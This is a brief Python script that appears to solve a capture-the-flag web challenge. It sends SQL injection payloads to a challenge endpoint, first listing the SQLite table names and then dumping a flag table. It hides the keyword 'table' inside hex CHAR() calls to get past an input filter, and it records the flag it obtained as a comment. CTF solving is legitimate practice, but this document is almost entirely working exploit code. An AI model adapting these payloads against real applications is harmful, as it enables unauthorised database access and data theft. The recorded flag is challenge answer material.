import requests

url = "https://seaofquills.2021.chall.actf.co/quills"
# url = "http://127.0.0.1:4567/quills"

# Find table names
# We can use the CHAR method to insert strings and circumvent the filter
# CHAR(0x74,0x61,0x62,0x6c,0x65) outputs 'table'
payload = {
    "limit":"5",
    "offset":"1",
    "cols":"name,name,name FROM sqlite_master WHERE type=CHAR(0x74,0x61,0x62,0x6c,0x65) UNION select desc,url,name"
    }

r = requests.post(url,params=payload)
print(r.text)
# This returns the tablename `flagtable`

# Use tablename to extract flag
payload = {
    "limit":"5",
    "offset":"1",
    "cols":"* FROM flagtable UNION select desc"
}

r = requests.post(url,params=payload)
print(r.text)
# Returns actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}
